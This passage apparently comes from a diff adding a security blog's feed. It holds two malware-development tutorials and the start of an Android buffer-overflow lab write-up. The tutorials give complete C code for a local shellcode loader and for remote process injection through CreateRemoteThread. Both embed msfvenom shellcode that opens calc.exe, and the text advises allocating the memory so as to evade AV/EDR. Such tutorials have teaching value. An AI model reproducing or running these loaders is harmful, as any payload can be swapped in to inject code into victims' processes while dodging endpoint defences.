+	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
+	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
+	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
+	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
+	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
+	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
+	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
+	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
+	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
+	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
+	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
+	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
+	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
+	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
+	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
+	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
+	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
+	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
+	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
+	0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
+};
+
+// we create a function called InjectRemoteProcess
+BOOL InjectRemoteProcess(DWORD Pid, PBYTE pShellcode, SIZE_T pShellcodeSize) {
+	// open process to specify Pid
+	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Pid);
+	if (hProcess == NULL) {
+		printf(&quot;[!] OpenProcess Failed With Error : %d \n&quot;, GetLastError());
+		return FALSE;
+	}
+	printf(&quot;[i] OpenProcess to PID: %i \n&quot;, Pid);
+
+	// allocating memory into a specific process id that you supply
+	PVOID pShellcodeAddress = VirtualAllocEx(hProcess, NULL, pShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+	if (pShellcodeAddress == NULL) {
+		printf(&quot;[!] VirtualAllocEx Failed With Error : %d \n&quot;, GetLastError());
+		return FALSE;
+	}
+	printf(&quot;[i] Allocated Memory At : 0x%p \n&quot;, pShellcodeAddress);
+
+	// write our shellcode into allocated memory
+	if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, pShellcodeSize, NULL)) {	
+		printf(&quot;[!] WriteProcessMemory Failed With Error : %d \n&quot;, GetLastError());
+		return FALSE;
+	}
+	printf(&quot;[i] Write shellcode to 0x%p\n&quot;, pShellcodeAddress);
+
+	// change to PAGE_EXECUTE_READWRITE
+	DWORD dwOldProtection = NULL;
+	if (!VirtualProtectEx(hProcess,pShellcodeAddress,pShellcodeSize, PAGE_EXECUTE_READWRITE,&amp;amp;dwOldProtection)) {
+		printf(&quot;[!] VirtualProtectEx Failed With Error : %d \n&quot;, GetLastError());
+		return FALSE;
+	}
+
+	// create new thread into remote process
+	printf(&quot;[i] Create remote thread to execute payload\n&quot;);
+	HANDLE hRemoteThread = CreateRemoteThread(hProcess,NULL,0, pShellcodeAddress,NULL,0,NULL);
+	if (hRemoteThread == NULL) {
+		printf(&quot;[!] CreateRemoteThread Failed With Error : %d \n&quot;, GetLastError());
+		return FALSE;
+	}
+	printf(&quot;[i] Done\n&quot;);
+
+	CloseHandle(hProcess);
+	CloseHandle(hRemoteThread);
+	return TRUE;
+}
+
+int main(int argc, char* argv[]) {
+	if (argc &amp;lt; 2) {
+		printf(&quot;[!] Usage : \&quot;%s\&quot; &amp;lt;Process ID&amp;gt; \n&quot;, argv[0]);
+		return -1;
+	}
+
+	int Pid = atoi(argv[1]);
+	SIZE_T pShellcodeSize = sizeof(pShellcode);
+	// calling the function
+	if (!(InjectRemoteProcess(Pid, pShellcode, pShellcodeSize))) {
+		return -1;
+	}
+	return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;Opening a Process&lt;/h3&gt;
+&lt;p&gt;You might familar writing Window API from the first post. First we created a function called &lt;code&gt;InjectRemoteProcess&lt;/code&gt;. Function parameters will be processID, shellcode and shellcode size.&lt;/p&gt;
+&lt;p&gt;The first API will be &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess&quot;&gt;OpenProcess&lt;/a&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;HANDLE OpenProcess(
+  [in] DWORD dwDesiredAccess,
+  [in] BOOL  bInheritHandle,
+  [in] DWORD dwProcessId
+);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;This is a new one. We use it to open a process in a specific &lt;code&gt;Pid&lt;/code&gt; that we have to supply as a argument like &lt;code&gt;.\ProcessInjection 1337&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;We used &lt;code&gt;PROCESS_ALL_ACCESS&lt;/code&gt; for &lt;code&gt;dwDesiredAccess&lt;/code&gt; parameter as per &lt;code&gt;MSDN&lt;/code&gt; page.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/maldev/maldev2.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;And &lt;code&gt;FALSE&lt;/code&gt; for &lt;code&gt;bInheritHandle&lt;/code&gt; since we don&apos;t want to inherit of any child of current process. We can use &lt;code&gt;FALSE&lt;/code&gt; for process injection. &lt;code&gt;dwProcessId&lt;/code&gt; will be our &lt;code&gt;Pid&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Pid);
+if (hProcess == NULL) {
+    printf(&quot;[!] OpenProcess Failed With Error : %d \n&quot;, GetLastError());
+    return FALSE;
+}
+printf(&quot;[i] OpenProcess to PID: %i \n&quot;, Pid);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;Allocating Memory&lt;/h3&gt;
+&lt;p&gt;As I said above, this is similar to &lt;code&gt;VirtualAlloc&lt;/code&gt; from the first post, &lt;code&gt;VirtualAllocEx&lt;/code&gt; is for allocating memory from a remote process. We just used &lt;code&gt;PAGE_READWRITE&lt;/code&gt; in here for a moment to avoid high entropy of AV/EDR. We will change this &lt;code&gt;PAGE_EXECUTE_READWRITE&lt;/code&gt; later using &lt;code&gt;VirtualProtectEx&lt;/code&gt; API. Now our code will be look like this:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;PVOID pShellcodeAddress = VirtualAllocEx(hProcess, NULL, pShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+if (pShellcodeAddress == NULL) {
+    printf(&quot;[!] VirtualAllocEx Failed With Error : %d \n&quot;, GetLastError());
+    return FALSE;
+}
+printf(&quot;[i] Allocated Memory At : 0x%p \n&quot;, pShellcodeAddress);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;Writing Shellcode to Allocated Memory&lt;/h3&gt;
+&lt;p&gt;Another new API is &lt;code&gt;WriteProcessMemory&lt;/code&gt; which for writing our shellcode into allocated memory to a remote process.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;BOOL WriteProcessMemory(
+  [in]  HANDLE  hProcess,
+  [in]  LPVOID  lpBaseAddress,
+  [in]  LPCVOID lpBuffer,
+  [in]  SIZE_T  nSize,
+  [out] SIZE_T  *lpNumberOfBytesWritten
+);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;hProcess&lt;/code&gt; is handle of our &lt;code&gt;OpenProcess&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;lpBaseAddress&lt;/code&gt; will be our &lt;code&gt;pShellcodeAddress&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;lpBuffer&lt;/code&gt; is our &lt;code&gt;pShellcode&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;nSize&lt;/code&gt; is the size of our shellcode &lt;code&gt;pShellcodeSize&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;lpNumberOfBytesWritten&lt;/code&gt; we can set &lt;code&gt;NULL&lt;/code&gt; for this.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, pShellcodeSize, NULL)) {	
+    printf(&quot;[!] WriteProcessMemory Failed With Error : %d \n&quot;, GetLastError());
+    return FALSE;
+}
+printf(&quot;[i] Write shellcode to 0x%p\n&quot;, pShellcodeAddress);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;VirtualProtectEx&lt;/code&gt; and &lt;code&gt;CreateRemoteThread&lt;/code&gt; are the same as from the first post.&lt;/p&gt;
+&lt;p&gt;At the end we have to close our handle.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;CloseHandle(hProcess);
+CloseHandle(hRemoteThread);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;After that we can call this &lt;code&gt;InjectRemoteProcess&lt;/code&gt; function from our main.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;int main(int argc, char* argv[]) {
+
+  // checking arguments
+  if (argc &amp;lt; 2) {
+    printf(&quot;[!] Usage : \&quot;%s\&quot; &amp;lt;Process ID&amp;gt; \n&quot;, argv[0]);
+    return -1;
+  }
+  // atoi for converting string to integer
+  int Pid = atoi(argv[1]);
+  // declare the size of the shellcode
+  SIZE_T pShellcodeSize = sizeof(pShellcode);
+  // calling the function
+  if (!(InjectRemoteProcess(Pid, pShellcode, pShellcodeSize))) {
+    return -1;
+  }
+  return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;Running the program&lt;/h3&gt;
+&lt;p&gt;Now compile the code in visual studio, open a &lt;code&gt;notepad.exe&lt;/code&gt;, find its process ID using &lt;code&gt;Process Hacker&lt;/code&gt; tool and run it.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/maldev/maldev3.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+</content:encoded></item><item><title>0x00 - Simple Shellcode Loader with C</title><link>https://r0x0rzx.github.io/posts/maldev/0x0-basic-shellcode-injection/</link><guid isPermaLink="true">https://r0x0rzx.github.io/posts/maldev/0x0-basic-shellcode-injection/</guid><pubDate>Sat, 15 Nov 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;In this module, we&apos;re gonna write a simple shellcode loader also known as local shellcode injection using C and Win32 API. If I get enough free time, I&apos;ll continue this as a malware development series. So let&apos;s start with a basic one.&lt;/p&gt;
+&lt;p&gt;To load our shellcode (&lt;code&gt;from msfvenom&lt;/code&gt;), we&apos;re gonna need these window APIs.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc&quot;&gt;VirtualAlloc&lt;/a&gt; - Allocate memory for our shellcode&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/devnotes/rtlmovememory&quot;&gt;RtlMoveMemory&lt;/a&gt; - Move our shellcode into allocated memory&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect&quot;&gt;VirtualProtect&lt;/a&gt; - To change memory region to as a executable&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread&quot;&gt;CreateThread&lt;/a&gt; - Create a thread to execute our shellcode&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject&quot;&gt;WaitForSingleObject&lt;/a&gt; - Wait until thread exection finished.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;What is Win32 API?&lt;/h3&gt;
+&lt;p&gt;For those who doesn&apos;t know yet what &lt;code&gt;Win32 API&lt;/code&gt; is, &lt;code&gt;Win32 API&lt;/code&gt; is the set of low level windows functions that let the software control things like windows, files, memory, and devices. It&apos;s how programs interact with the windows operating system behind the scenes.&lt;/p&gt;
+&lt;p&gt;Before we get started, let&apos;s review the code first to get clear vision.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#include &amp;lt;windows.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+
+// calc.exe shellcode from msfvenom
+unsigned char shellcode[] = {
+    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
+    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
+    0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
+    0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
+    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
+    0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
+    0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
+    0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
+    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
+    0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
+    0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
+    0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
+    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
+    0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
+    0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
+    0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
+    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
+    0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
+    0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
+    0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
+    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
+    0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
+    0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
+};
+
+int main() {
+    SIZE_T shellcodeSize = sizeof(shellcode);
+    printf(&quot;[+] Shellcode size: %zu bytes\n&quot;, shellcodeSize);  
+
+    // allocating memory
+    PVOID pShellcodeAddress = VirtualAlloc(NULL,shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (pShellcodeAddress == NULL) {
+        printf(&quot;[-] Failed to allocate memory\n&quot;);
+        return -1;
+    }
+    printf(&quot;[+] Memory allocated at: 0x%p\n&quot;, pShellcodeAddress);
+
+    // copy shellcode to executable memory
+    // we can use a simple memcpy here
+    // memcpy(pShellcodeAddress, shellcode, shellcodeSize);
+
+    RtlMoveMemory(pShellcodeAddress, shellcode, shellcodeSize);
+    printf(&quot;[+] Copied shellcode to: 0x%p\n&quot;, pShellcodeAddress);
+
+    printf(&quot;[+] Changed memory region to: PAGE_EXECUTE_READWRITE\n&quot;);
+    DWORD dwOldProtection = NULL;
+    if (!VirtualProtect(pShellcodeAddress, shellcodeSize, PAGE_EXECUTE_READWRITE, &amp;amp;dwOldProtection)) {
+        printf(&quot;[!] VirtualProtect Failed With Error : %d \n&quot;, GetLastError());
+        return -1;
+    }
+
+    printf(&quot;[*] Creating new thread\n&quot;);
+    // create a new thread to execute the shellcode
+    HANDLE hThread = CreateThread(NULL, 0, pShellcodeAddress,NULL,0,NULL);
+    if (hThread == NULL) {
+        printf(&quot;[!] CreateThread Failed With Error : %d \n&quot;, GetLastError());
+        return -1;
+    }
+    // wait for the thread to finish execution
+    WaitForSingleObject(hThread, INFINITE);
+
+    // cleaning up
+    CloseHandle(hThread);
+    VirtualFree(pShellcodeAddress, 0, MEM_RELEASE);
+    printf(&quot;[+] Done&quot;);
+    return 0;
+}
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;Allocating Memory&lt;/h3&gt;
+&lt;p&gt;The first thing we need to do is to allocate memory region for our shellcode with &lt;code&gt;VirtualAlloc&lt;/code&gt;. If you don&apos;t know what &lt;code&gt;VirtualAlloc&lt;/code&gt; does and what kind of parameters its has, we can search in google like &lt;code&gt;VirtualAlloc msdn&lt;/code&gt;. So it will show the whole microsoft documentation of that related API. For example:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;LPVOID VirtualAlloc(
+  [in, optional] LPVOID lpAddress,
+  [in]           SIZE_T dwSize,
+  [in]           DWORD  flAllocationType,
+  [in]           DWORD  flProtect
+);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Before we look at the parameters, you&apos;ll see tags like &lt;code&gt;[in]&lt;/code&gt; or &lt;code&gt;[out]&lt;/code&gt;.
+&lt;code&gt;[in]&lt;/code&gt; means we must provide a value for that parameter.
+&lt;code&gt;[out]&lt;/code&gt; means the function will give us a value back through that parameter.&lt;/p&gt;
+&lt;p&gt;And you might notice some of window data types throughout the series such as &lt;code&gt;LPVOID&lt;/code&gt;, &lt;code&gt;PVOID&lt;/code&gt;, &lt;code&gt;SIZE_T&lt;/code&gt;, &lt;code&gt;BOOL&lt;/code&gt;, &lt;code&gt;HANDLE&lt;/code&gt; and many more. We just have to declare base on the type of our variables. You can learn it more from &lt;code&gt;MSDN&lt;/code&gt; page.&lt;/p&gt;
+&lt;p&gt;That&apos;s why we used &lt;code&gt;pShellcodeAddress&lt;/code&gt; as a &lt;code&gt;PVOID&lt;/code&gt; or &lt;code&gt;LPVOID&lt;/code&gt; and &lt;code&gt;shellcodeSize&lt;/code&gt; as a &lt;code&gt;SIZE_T&lt;/code&gt; in here.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;lpAddress&lt;/code&gt; is the starting address where we want our memory block to begin. We used &lt;code&gt;NULL&lt;/code&gt;, so windows will pick the location automatically by itself.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;dwSize&lt;/code&gt; is the size of our shellcode that we declared in line number 9.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;For &lt;code&gt;flAllocationType&lt;/code&gt;, we used &lt;code&gt;MEM_COMMIT | MEM_RESERVE&lt;/code&gt;. So what are these? You can also read details in &lt;code&gt;MSDN&lt;/code&gt; page. For now, &lt;code&gt;MEM_RESERVE&lt;/code&gt; is like make a reservation a memory space to use later. &lt;code&gt;MEM_COMMIT&lt;/code&gt; is like I&apos;m gonna use that reserved space. To be clear :&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;MEM_RESERVE&lt;/code&gt; = &quot;I&apos;ll need this space later&quot;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;MEM_COMMIT&lt;/code&gt; = &quot;I&apos;m putting my stuff here now&quot;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;MEM_COMMIT | MEM_RESERVE&lt;/code&gt; = &quot;I need space with stuff right now&quot;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;flProtect&lt;/code&gt; is like what we are allowed to do with that memory region. For example, can we have read access, write access or execute it as a code? It has multiple values in &lt;code&gt;MSDN&lt;/code&gt; page like&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;PAGE_EXECUTE&lt;/li&gt;
+&lt;li&gt;PAGE_EXECUTE_READ&lt;/li&gt;
+&lt;li&gt;PAGE_EXECUTE_READWRITE&lt;/li&gt;
+&lt;li&gt;PAGE_READONLY&lt;/li&gt;
+&lt;li&gt;And more&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We could simply just pass &lt;code&gt;PAGE_EXECUTE_READWRITE&lt;/code&gt; to &lt;code&gt;VirtualAlloc&lt;/code&gt;, but doing this is a major red flag for AV/EDR. For best practice as a malware developer, we allocate the memory as &lt;code&gt;PAGE_READWRITE&lt;/code&gt; first, and then change it to executable using &lt;code&gt;VirtualProtect&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;So, If our function succeeds, the return value is the base address of the allocated region of pages. (How to know? from &lt;code&gt;MSDN&lt;/code&gt; page for sure). If &lt;code&gt;NULL&lt;/code&gt;, it failed to allocate. We can handle the error like this:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;if (pShellcodeAddress == NULL) {
+    printf(&quot;\t[!] VirtualAlloc Failed With Error : %d \n&quot;, GetLastError());
+	return FALSE;
+}
+
+// we can also use a simple memcpy here
+// memcpy(pShellcodeAddress, shellcode, shellcodeSize);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;Moving Shellcode&lt;/h3&gt;
+&lt;p&gt;Now that we have allocated a memory region for our shellcode, the next step is to copy the shellcode into that buffer using &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/devnotes/rtlmovememory&quot;&gt;RtlMoveMemory&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Syntax from &lt;code&gt;MSDN&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;VOID RtlMoveMemory(
+  _Out_       VOID UNALIGNED *Destination,
+  _In_  const VOID UNALIGNED *Source,
+  _In_        SIZE_T         Length
+);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;Destination&lt;/code&gt; is the address returned by &lt;code&gt;VirtualAlloc&lt;/code&gt;. &lt;code&gt;Source&lt;/code&gt; will be our shellcode and &lt;code&gt;Length&lt;/code&gt; is the total size of the shellcode.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;RtlMoveMemory(pShellcodeAddress, shellcode, shellcodeSize);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;After moving the shellcode, we need to change the memory region to be executable using &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect&quot;&gt;VirtualProtect&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Syntax from &lt;code&gt;MSDN&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;BOOL VirtualProtect(
+  [in]  LPVOID lpAddress,
+  [in]  SIZE_T dwSize,
+  [in]  DWORD  flNewProtect,
+  [out] PDWORD lpflOldProtect
+);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;As you can see &lt;code&gt;lpflOldProtect&lt;/code&gt; is &lt;code&gt;[out]&lt;/code&gt;. This is required because &lt;code&gt;VirtualProtect&lt;/code&gt; must return the previous memory protection for that region. If the function succeed, the return value will be nonzero.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;DWORD dwOldProtection = NULL;
+
+if (!VirtualProtect(pShellcodeAddress, shellcodeSize, PAGE_EXECUTE_READWRITE, &amp;amp;dwOldProtection)) {
+    printf(&quot;[!] VirtualProtect Failed With Error : %d \n&quot;, GetLastError());
+    return -1;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Then we need to create a new thread to execute the shellcode. In this case, we&apos;re going to use &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread&quot;&gt;CreateThread&lt;/a&gt; API to create a thread.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;HANDLE CreateThread(
+  [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
+  [in]            SIZE_T                  dwStackSize,
+  [in]            LPTHREAD_START_ROUTINE  lpStartAddress,
+  [in, optional]  __drv_aliasesMem LPVOID lpParameter,
+  [in]            DWORD                   dwCreationFlags,
+  [out, optional] LPDWORD                 lpThreadId
+);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We will use our &lt;code&gt;pShellcodeAddress&lt;/code&gt; as the &lt;code&gt;lpStartAddress&lt;/code&gt; for the new thread and the other parameters can be set to &lt;code&gt;NULL&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;HANDLE hThread = CreateThread(NULL, 0, pShellcodeAddress,NULL,0,NULL);
+
+if (hThread == NULL) {
+    printf(&quot;\t[!] CreateThread Failed With Error : %d \n&quot;, GetLastError());
+	return FALSE;
+}
+
+WaitForSingleObject(hThread, INFINITE);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;WaitForSingleObject&lt;/code&gt; is to wait the thread to finish execution.&lt;/p&gt;
+&lt;h3&gt;Deallocating Memory&lt;/h3&gt;
+&lt;p&gt;Now the last things to do is to clean up the allocated memory using &lt;code&gt;VirtualFree&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;CloseHandle(hThread);
+VirtualFree(pShellcodeAddress, 0, MEM_RELEASE);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;So let&apos;s just run our code in visual studio and you can see it will pop up &lt;code&gt;calc.exe&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/maldev/maldev1.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+</content:encoded></item><item><title>MobileHacking - NoteKeeper Buffer Overflow Lab</title><link>https://r0x0rzx.github.io/posts/android/note-keeper-lab-bof/</link><guid isPermaLink="true">https://r0x0rzx.github.io/posts/android/note-keeper-lab-bof/</guid><pubDate>Thu, 30 Oct 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;I saw someone shared this lab on linkedin and bufferoverlfow grabbed my attention. Since I really enjoy exploitation, I thought I should take a look.&lt;/p&gt;
+&lt;p&gt;This is lab description : https://www.mobilehackinglab.com/course/lab-notekeeper&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/android/notekeeper/nk1.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;We&apos;re given an APK file to start which is called &lt;code&gt;NoteKeeper&lt;/code&gt;. We can create a list of notes.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/android/notekeeper/nk2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;I opened the app in &lt;a href=&quot;https://github.com/skylot/jadx&quot;&gt;jadx-gui&lt;/a&gt;, but there wasn’t anything interesting in &lt;code&gt;MainActivity&lt;/code&gt;. The only thing that was a call to a native library named &lt;code&gt;notekeeper&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/android/notekeeper/nk3.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;So I quickly exported &lt;code&gt;libnotekeeper.so&lt;/code&gt; file and load it into &lt;code&gt;Ghidra&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/android/notekeeper/nk4.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;In ghidra, we can see there is a function called &lt;code&gt;Java_com_mobilehackinglab_notekeeper_MainActivity_parse&lt;/code&gt;.&lt;/p&gt;
